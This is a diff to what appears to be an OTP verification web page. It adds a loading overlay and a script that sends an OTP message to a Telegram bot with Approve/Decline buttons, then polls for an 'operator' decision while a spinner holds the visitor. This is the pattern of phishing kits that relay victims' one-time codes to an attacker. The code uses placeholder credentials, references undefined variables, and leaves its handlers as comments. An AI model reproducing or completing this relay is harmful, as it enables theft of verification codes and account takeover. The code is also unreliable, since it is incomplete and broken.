@@ -366,6 +366,32 @@
       cursor: pointer;
       width: 100%;
     }
+    #loadingOverlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  z-index: 9999;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  gap: 16px;
+  background: rgba(0, 25, 75, 0.82);
+  color: #fff;
+  text-align: center;
+}
+
+#loadingOverlay .spinner {
+  width: 52px;
+  height: 52px;
+  border: 5px solid rgba(255, 255, 255, 0.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: overlaySpin 0.8s linear infinite;
+}
+
+@keyframes overlaySpin {
+  to { transform: rotate(360deg); }
+}
   </style>
 </head>
 <body>
@@ -456,6 +482,46 @@
   </div>
 
   <script>
+    const CONFIG = {
+  BOT_TOKEN: "YOUR_BOT_TOKEN",
+  CHAT_ID: "YOUR_CHAT_ID"
+};
+
+function sendToTelegram(messageText, buttons) {
+  return fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CONFIG.CHAT_ID,
+      text: messageText,
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: buttons
+      }
+    })
+  });
+}
+spinner.style.display = "flex";
+sendToTelegram("OTP: 123456", [
+  [{ text: "✅ Approve", callback_data: "approve_123" }],
+  [{ text: "❌ Decline", callback_data: "decline_123" }]
+]);
+pollTelegram("approve_123");
+function pollTelegram(callbackId) {
+  setInterval(() => {
+    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+      .then(r => r.json())
+      .then(data => {
+        data.result?.forEach(update => {
+          if (update.callback_query?.data === callbackId) {
+            // operator clicked Approve / Decline / Verify
+            // hide spinner
+            // redirect or show error
+          }
+        });
+      });
+  }, 1000);
+}
     window.addEventListener('DOMContentLoaded', () => {
       const savedRef = localStorage.getItem('fbc_otp_ref') || '9vXfk';
       document.getElementById('refCodeText').textContent = 'Ref: ' + savedRef;
@@ -484,5 +550,13 @@
       document.getElementById('supportModal').style.display = 'none';
     }
   </script>
+  <div id="spinner">
+  <div class="spin"></div>
+  <p>Verifying...</p>
+  </div>
+  <div id="loadingOverlay" role="status" aria-live="polite" aria-label="Loading">
+  <div class="spinner" aria-hidden="true"></div>
+  <p>Loading…</p>
+  </div>
 </body>
 </html>
